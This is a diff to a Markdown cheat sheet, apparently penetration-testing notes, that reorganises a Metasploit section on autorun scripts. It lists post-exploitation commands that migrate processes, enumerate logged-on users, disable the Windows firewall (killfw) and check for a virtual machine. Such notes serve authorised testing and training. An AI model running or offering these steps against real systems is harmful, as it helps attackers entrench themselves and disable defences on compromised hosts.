@@ -54,12 +54,22 @@ Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
 
 #### After setting routes use bind shells
 
-#### Autorun script
-Create a .rc file and use it like:
+## Autorun script
+### Set solo module as autorunscript
 ```
-set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
 set AutoRunScript windows/gather/enum_logged_on_users
 set AutoRunScript post/windows/manage/migrate
+```
+
+#### Create a .rc file and use it like:
+```
+run post/windows/manage/migrate
+run post/windows/manage/killfw
+run post/windows/gather/checkvm
+```
+
+```
+set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
 ```
 
 ## Metasploit automation run automatic script
